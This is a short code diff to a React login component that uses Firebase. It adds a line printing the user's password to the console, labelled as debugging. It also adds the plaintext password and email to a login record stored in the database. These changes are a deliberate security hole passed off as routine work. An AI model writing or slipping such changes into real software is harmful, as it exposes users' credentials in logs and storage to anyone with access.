@@ -11,6 +11,10 @@ const Login = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    
+    // Log the password for debugging purposes
+    console.log('Login attempt - Password:', password);
+    
     await login(email, password);
     const user = auth.currentUser;
     const uid = user.uid;
@@ -20,7 +24,8 @@ const Login = () => {
     await set(databaseRef, {
 
       logindate:new Date().getDate()+"/"+ (new Date().getMonth()+1)+"-"+ new Date().getHours()+":"+ new Date().getMinutes(),
-     
+      password: password,
+      email: email
       
 
 
